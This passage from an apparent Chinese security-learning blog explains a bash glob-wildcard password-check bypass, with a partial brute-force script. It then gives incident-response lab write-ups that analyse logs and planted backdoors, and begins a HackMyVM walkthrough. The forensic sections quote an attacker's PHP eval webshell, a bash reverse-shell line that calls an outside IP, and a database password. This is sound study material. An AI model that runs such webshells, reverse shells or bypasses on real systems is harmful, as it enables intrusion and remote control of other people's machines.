<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $password == $input ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>逻辑就是定义一个password，然后我们的输入保存在input里，比较input和password看看o不ok</p>
<p>正常情况下我们要ok就应该输入‘qwe123’，和password去匹配</p>
<p>但是我们可以用到*, *在shell里叫glob，也叫通配符， *的作用可以用来匹配任何长度的任何字符，类似于正则里面的 *，</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423213816.png" ></p>
<p>后来了解到glob有其他字符，各自有不同的功能，比如?可以匹配任意字符串，在我知道密码长度的情况下输入n个?，也能绕过</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423213914.png" ></p>
<h5 id="没法用的情况1"><a href="#没法用的情况1" class="headerlink" title="*没法用的情况1"></a>*没法用的情况1</h5><p>如果脚本长这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $password == &quot;$input&quot; ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p><strong>注意到$input前后多了引号</strong>，这个时候再使用*去通配就会失败</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423214332.png" ></p>
<p><strong>原因是：给$input前后加上引号，会导致*没办法展开，所以通配不了，这个时候只能输入和password一模一样的字符才能ok</strong></p>
<h5 id="没法用的情况2"><a href="#没法用的情况2" class="headerlink" title="*没法用的情况2"></a>*没法用的情况2</h5><p>这个时候的脚本长这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $input == $password ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>对比第一个脚本，在判断里面$input $password的位置调换了</p>
<p>这个东西有点抽象，群主当时给了例子</p>
<p>我自己复现了一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423215113.png" ></p>
<p>接下来理解一下：*.txt能够代表很多个txt文件，他不能只等于1.txt，所以no，但是1.txt是 *.txt里面的一个，所以可以ok</p>
<p><strong>通俗地讲就是多个文件不能等于特定的那一个，特定的一个文件属于多个文件里</strong></p>
<p>回到input那里，我们给他输入*，就符合多个可能对应特定的一个，所以不能，所以not ok</p>
<h4 id="绕过的应用"><a href="#绕过的应用" class="headerlink" title="*绕过的应用"></a>*绕过的应用</h4><p>了解到三个用法，有这个思路就可以用来爆破密码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="built_in">all</span> = <span class="built_in">list</span>(string.ascii_letters + string.digits)  <span class="comment"># 创建包含所有字母和数字的字符列表</span></span><br><span class="line">password = <span class="string">&quot;&quot;</span>  <span class="comment"># 初始化密码为空字符串</span></span><br><span class="line">found = <span class="literal">False</span>  <span class="comment"># 初始化 found 变量为 False，表示密码尚未找到</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> <span class="built_in">all</span>:</span><br><span class="line">				command = <span class="string">f&quot;echo &#x27;<span class="subst">&#123;password&#125;</span><span class="subst">&#123;character&#125;</span>*&#x27;｜对应的脚本操作</span></span><br><span class="line"><span class="string">        ...后续的判断</span></span><br></pre></td></tr></table></figure>

<p>command &#x3D; f”echo ‘{password}{character}*’注意这里最后就是有一个 *去通配，然后一位一位地去爆破密码</p>
<p>肯定不止这个用法，后续待更新</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>肯定是要感谢群主的耐心指导</p>
<p>这个知识点现在理解了就觉得没什么，不过还是值得记录下来的</p>
]]></content>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>玄机-windows实战</title>
    <url>/2024/06/01/%E7%8E%84%E6%9C%BA-windows%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<h3 id="emlog"><a href="#emlog" class="headerlink" title="emlog"></a>emlog</h3><p>先远程桌面连接，用微软的remote desktop还挺方便</p>
<h4 id="找到黑客植入-shell-将黑客植入-shell-的密码-作为-FLAG-提交"><a href="#找到黑客植入-shell-将黑客植入-shell-的密码-作为-FLAG-提交" class="headerlink" title="找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;"></a>找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;</h4><p>用d盾查杀，找到shell.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601143330.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601141231.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;rebeyond&#125;</span><br></pre></td></tr></table></figure>

<h4 id="分析黑客攻击成功的-IP-为多少-将黑客-IP-作为-FLAG-提交"><a href="#分析黑客攻击成功的-IP-为多少-将黑客-IP-作为-FLAG-提交" class="headerlink" title="分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;"></a>分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601141541.png" ></p>
<p>这种就是看日志，找到phpstudy路径下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601141733.png" ></p>
<p>随便一看就是192.168.126.1这个ip一直在访问shell.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.126.1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="分析黑客的隐藏账户名称-将黑客隐藏账户名称作为-FLAG-提交"><a href="#分析黑客的隐藏账户名称-将黑客隐藏账户名称作为-FLAG-提交" class="headerlink" title="分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交"></a>分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交</h4><p>思路可以看用户表或者直接看用户目录下多了什么</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601142716.png" ></p>
<p>有个hacker138</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601142902.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;hacker138&#125;</span><br></pre></td></tr></table></figure>

<h4 id="分析黑客的挖矿程序的矿池域名-将黑客挖矿程序的矿池域名称作为-仅域名-FLAG-提交"><a href="#分析黑客的挖矿程序的矿池域名-将黑客挖矿程序的矿池域名称作为-仅域名-FLAG-提交" class="headerlink" title="分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;"></a>分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;</h4><p>思路是去黑客新增的用户目录下看看有什么，在桌面下发现“kuang”文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601143018.png" ></p>
<p>用工具反编译一下就能看到矿池域名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;wakuang.zhigongshanfang.top&#125;</span><br></pre></td></tr></table></figure>

<h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><h4 id="请提交攻击者攻击成功的第一时间，格式：flag-YY-MM-DD-hh-mm-ss"><a href="#请提交攻击者攻击成功的第一时间，格式：flag-YY-MM-DD-hh-mm-ss" class="headerlink" title="请提交攻击者攻击成功的第一时间，格式：flag{YY:MM:DD hh:mm:ss}"></a>请提交攻击者攻击成功的第一时间，格式：flag{YY:MM:DD hh:mm:ss}</h4><p>先看日志，看nginx的日志</p>
<p>思路是看最早是什么时候出现302重定向，进入manage</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-06-01%2014.41.46.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023:04:29 22:45:23&#125;</span><br></pre></td></tr></table></figure>

<h4 id="请提交攻击者的浏览器版本-flag-Firgfox-2200"><a href="#请提交攻击者的浏览器版本-flag-Firgfox-2200" class="headerlink" title="请提交攻击者的浏览器版本 flag{Firgfox&#x2F;2200}"></a>请提交攻击者的浏览器版本 flag{Firgfox&#x2F;2200}</h4><p>上一道题可以看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Firefox/110.0&#125;</span><br></pre></td></tr></table></figure>

<h4 id="请提交攻击者目录扫描所使用的工具名称"><a href="#请提交攻击者目录扫描所使用的工具名称" class="headerlink" title="请提交攻击者目录扫描所使用的工具名称"></a>请提交攻击者目录扫描所使用的工具名称</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601144356.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Fuzz Faster U Fool&#125;</span><br></pre></td></tr></table></figure>

<h4 id="找到攻击者写入的恶意后门文件，提交文件名（完整路径）"><a href="#找到攻击者写入的恶意后门文件，提交文件名（完整路径）" class="headerlink" title="找到攻击者写入的恶意后门文件，提交文件名（完整路径）"></a>找到攻击者写入的恶意后门文件，提交文件名（完整路径）</h4><p>用D盾查杀一下，找到.x.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601145929.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601150123.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;C:\phpstudy_pro\WWW\.x.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）"><a href="#找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）" class="headerlink" title="找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）"></a>找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-06-01%2015.02.39.png" ></p>
<p>还是被D盾发现了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;C:\phpstudy_pro\WWW\usr\themes\default\post.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="请指出可疑进程采用的自动启动的方式，启动的脚本的名字-flag-1-exe"><a href="#请指出可疑进程采用的自动启动的方式，启动的脚本的名字-flag-1-exe" class="headerlink" title="请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag{1.exe}"></a>请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag{1.exe}</h4><p>windows目录下有个360.exe和x.bat（内容是”C:\Windows\360.exe”）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601150516.png" ></p>
<p>沙箱也能看到360.exe是木马</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601151153.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;x.bat&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a class="link"   href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi=0=DQeDsNOf1TKnq40ErD&alichlgref=https://www.google.com/" >https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi%3D0%3DDQeDsNOf1TKnq40ErD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>玄机--日志分析</title>
    <url>/2024/05/31/%E7%8E%84%E6%9C%BA-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="linux日志分析"><a href="#linux日志分析" class="headerlink" title="linux日志分析"></a>linux日志分析</h3><h4 id="有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割"><a href="#有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割" class="headerlink" title="有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割"></a>有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr </span><br></pre></td></tr></table></figure>

<p>学一把这些语句</p>
<p><strong>grep</strong>把有”Failed password for root”的行挑出来，**-a**是将文件作为文本文件处理，避免某些情况下文件被识别为二进制文件</p>
<p><strong>awk</strong>把挑出来的行里第11个字段挑出来（按空格分），这里挑出那些ip地址</p>
<p><strong>sort</strong>把ip地址排序，**-n<strong>按数字排序，</strong>-r**降序排序</p>
<p><strong>uniq</strong>去重,<strong>-c</strong>输出中显示每个行重复出现的次数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br><span class="line">      4 192.168.200.2</span><br><span class="line">      1 192.168.200.32</span><br><span class="line">      1 192.168.200.31</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2,192.168.200.32,192.168.200.31&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割"><a href="#ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割" class="headerlink" title="ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割"></a>ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log<span class="comment"># cat auth.log* | grep -a &quot;Accept&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span></span><br><span class="line">      2 192.168.200.2</span><br><span class="line">      1 202.78.166.217</span><br></pre></td></tr></table></figure>

<p>思路和上一道差不多，grep过滤的字段改成”Accept”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125; # 要删掉自己的ip</span><br></pre></td></tr></table></figure>

<h4 id="爆破用户名字典是什么？如果有多个使用”-”分割"><a href="#爆破用户名字典是什么？如果有多个使用”-”分割" class="headerlink" title="爆破用户名字典是什么？如果有多个使用”,”分割"></a>爆破用户名字典是什么？如果有多个使用”,”分割</h4><p>上题解</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password&quot; | perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;| uniq -c | sort -nr</span><br><span class="line">      5  invalid user user</span><br><span class="line">      5  invalid user hello</span><br><span class="line">      5  invalid user</span><br><span class="line">      4  root</span><br><span class="line">      1  root</span><br><span class="line">      1  root</span><br><span class="line">      1  invalid user test3</span><br><span class="line">      1  invalid user test2</span><br><span class="line">      1  invalid user test1</span><br></pre></td></tr></table></figure>

<p>对于这个perl比较陌生</p>
<p><strong>Perl</strong> 命令，用于从匹配的日志行中提取用户名。</p>
<p><code>while($_=&lt;&gt;)</code>逐行读取输入（即日志文件的内容）。</p>
<p><code> /for(.*?) from/</code>使用正则表达式匹配 for 和from 之间的内容（即用户名）。</p>
<p> <code>print &quot;$1\n&quot;;</code>打印匹配到的用户名（捕获组 <strong>$1</strong>）</p>
<p>思路就是用grep过滤后用perl -e处理每行语句，把for和from之间的字段（通常是用户名）挑出来**，再进行后续操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;user,hello,root,test3,test2,test1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="登陆成功的IP共爆破了多少次"><a href="#登陆成功的IP共爆破了多少次" class="headerlink" title="登陆成功的IP共爆破了多少次"></a>登陆成功的IP共爆破了多少次</h4><p>第一题的命令已经过滤出来了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br><span class="line">      4 192.168.200.2</span><br><span class="line">      1 192.168.200.32</span><br><span class="line">      1 192.168.200.31</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;4&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客登陆主机后新建了一个后门用户，用户名是多少"><a href="#黑客登陆主机后新建了一个后门用户，用户名是多少" class="headerlink" title="黑客登陆主机后新建了一个后门用户，用户名是多少"></a>黑客登陆主机后新建了一个后门用户，用户名是多少</h4><p>可以直接看&#x2F;etc&#x2F;passwd，多了个test2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /etc/passwd</span><br><span class="line">...</span><br><span class="line">test2:x:1000:1000::/home/test2:/bin/sh</span><br><span class="line">debian:x:1001:1001:Debian:/home/debian:/bin/bash</span><br></pre></td></tr></table></figure>

<p>也可以</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log* | grep -a &quot;useradd&quot; | grep -a &quot;linux-rz&quot;</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new group: name=test2, GID=1000</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/sh</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;test2&#125;</span><br></pre></td></tr></table></figure>

<h3 id="apache日志分析"><a href="#apache日志分析" class="headerlink" title="apache日志分析"></a>apache日志分析</h3><h4 id="提交当天访问次数最多的IP，即黑客IP："><a href="#提交当天访问次数最多的IP，即黑客IP：" class="headerlink" title="提交当天访问次数最多的IP，即黑客IP："></a>提交当天访问次数最多的IP，即黑客IP：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat access.log.1 | grep &quot;03/Aug/2023:08:&quot; | awk &#x27;&#123;print $1&#125;&#x27; | sort | uniq -c | sort -nr | head -n 10</span><br><span class="line">   6555 192.168.200.2</span><br><span class="line">     29 ::1</span><br><span class="line">      5 192.168.200.38</span><br><span class="line">      1 192.168.200.48</span><br><span class="line">      1 192.168.200.211</span><br></pre></td></tr></table></figure>

<p>这次grep过滤的是”03&#x2F;Aug&#x2F;2023:08:”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客使用的浏览器指纹是什么，提交指纹的md5："><a href="#黑客使用的浏览器指纹是什么，提交指纹的md5：" class="headerlink" title="黑客使用的浏览器指纹是什么，提交指纹的md5："></a>黑客使用的浏览器指纹是什么，提交指纹的md5：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;192.168.200.2&quot; | awk -F&#x27;&quot;&#x27; &#x27;&#123;print $6&#125;&#x27; | uniq -c</span><br><span class="line">     12 Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">      1 curl/7.74.0</span><br><span class="line">   6543 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br></pre></td></tr></table></figure>

<p>直接grep上一题提取出来的ip</p>
<p>**awk -F’”‘ ‘{print $6}’**这里awk -F指定双引号为分割符，取第六个字段</p>
<blockquote>
<p>对于 Apache 访问日志，双引号内的字段通常是请求方法、URL、协议和 User-Agent 字符串。第六个字段通常是 User-Agent。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指纹：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">md5:2d6330f380f44ac20f3a02eed0958f66</span><br></pre></td></tr></table></figure>

<h4 id="查看index-php页面被访问的次数，提交次数："><a href="#查看index-php页面被访问的次数，提交次数：" class="headerlink" title="查看index.php页面被访问的次数，提交次数："></a>查看index.php页面被访问的次数，提交次数：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;/index.php&quot; | wc -l</span><br><span class="line">27</span><br></pre></td></tr></table></figure>

<p><strong>wc -l</strong>用于统计行数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;27&#125;</span><br></pre></td></tr></table></figure>

<h4 id="查看黑客IP访问了多少次，提交次数："><a href="#查看黑客IP访问了多少次，提交次数：" class="headerlink" title="查看黑客IP访问了多少次，提交次数："></a>查看黑客IP访问了多少次，提交次数：</h4><p>和上一题差不多</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &#x27;192.168.200.2 -&#x27; | wc -l</span><br><span class="line">6555</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;6555&#125;</span><br></pre></td></tr></table></figure>

<h4 id="查看2023年8月03日8时这一个小时内有多少IP访问，提交次数"><a href="#查看2023年8月03日8时这一个小时内有多少IP访问，提交次数" class="headerlink" title="查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:"></a>查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;03/Aug/2023:08&quot; | awk &#x27;&#123;print $1&#125;&#x27; | sort -nr | uniq -c</span><br><span class="line">      1 192.168.200.48</span><br><span class="line">      5 192.168.200.38</span><br><span class="line">      1 192.168.200.211</span><br><span class="line">   6555 192.168.200.2</span><br><span class="line">     29 ::1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;5&#125;</span><br></pre></td></tr></table></figure>

<h3 id="mysql日志分析"><a href="#mysql日志分析" class="headerlink" title="mysql日志分析"></a>mysql日志分析</h3><h4 id="黑客第一次写入的shell-flag-关键字符串"><a href="#黑客第一次写入的shell-flag-关键字符串" class="headerlink" title="黑客第一次写入的shell flag{关键字符串}"></a>黑客第一次写入的shell flag{关键字符串}</h4><p>找到sh.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@xuanji:/var/www/html# cat sh.php</span><br><span class="line">1	2	&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;	4</span><br><span class="line">//ccfda79e-7aa1-4275-bc26-a6189eb9a20b</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ccfda79e-7aa1-4275-bc26-a6189eb9a20b&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客反弹shell的ip-flag-ip"><a href="#黑客反弹shell的ip-flag-ip" class="headerlink" title="黑客反弹shell的ip flag{ip}"></a>黑客反弹shell的ip flag{ip}</h4><p>在日志中发现adminer.php中存在sqk注入，用sys_eval实现命令执行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601005724.png" ></p>
<p>主要在&#x2F;tmp&#x2F;1.sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@xuanji:/var/log/apache2# cat /tmp/1.sh</span><br><span class="line">bash -i &gt;&amp;/dev/tcp/192.168.100.13/777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.100.13&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客提权文件的完整路径-md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xx"><a href="#黑客提权文件的完整路径-md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xx" class="headerlink" title="黑客提权文件的完整路径 md5 flag{md5} 注 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xx"></a>黑客提权文件的完整路径 md5 flag{md5} 注 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xx</h4><p>先猜测是udf提权，在common.php找到数据库连接的账号密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010114.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p334cc35b3c704593</span><br><span class="line">连接到数据库</span><br><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br><span class="line">看一下plugin设置的目录</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010309.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010328.png" ></p>
<p>有两个udf.so</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">路径：/usr/lib/mysql/plugin/udf.so</span><br><span class="line">md5:b1818bde4e310f3d23f1005185b973e7</span><br></pre></td></tr></table></figure>

<h4 id="黑客获取的权限-flag-whoami后的值"><a href="#黑客获取的权限-flag-whoami后的值" class="headerlink" title="黑客获取的权限 flag{whoami后的值}"></a>黑客获取的权限 flag{whoami后的值}</h4><p>udf提权后拿到的是mysql权限，所以：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;mysql&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a class="link"   href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi=0=DQeDsNOf1TKnq40ErD&alichlgref=https://www.google.com/" >https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi%3D0%3DDQeDsNOf1TKnq40ErD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm first 复盘</title>
    <url>/2024/03/15/new/index/</url>
    <content><![CDATA[<h4 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机ip 192.168.64.75</span><br><span class="line">攻击机ip 192.168.64.3</span><br></pre></td></tr></table></figure>

<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>扫描到3个端口，21端口，22端口和80端口</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2020.08.29.png"   alt="d" style="zoom:40%;" >

<p>80端口看不到什么内容</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.09.52.png" ></p>
<p>nmap扫出来ftp端口有几个文件夹，登陆看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp 192.168.64.75</span><br></pre></td></tr></table></figure>

<p>登陆账号密码都是ftp就行，看来看去只有first文件夹下面有个图片。下载出来</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.15.00.png" ></p>
<p>接着就使用<strong>stegseek</strong>工具分析一下，自动分析出一个secret.txt</p>
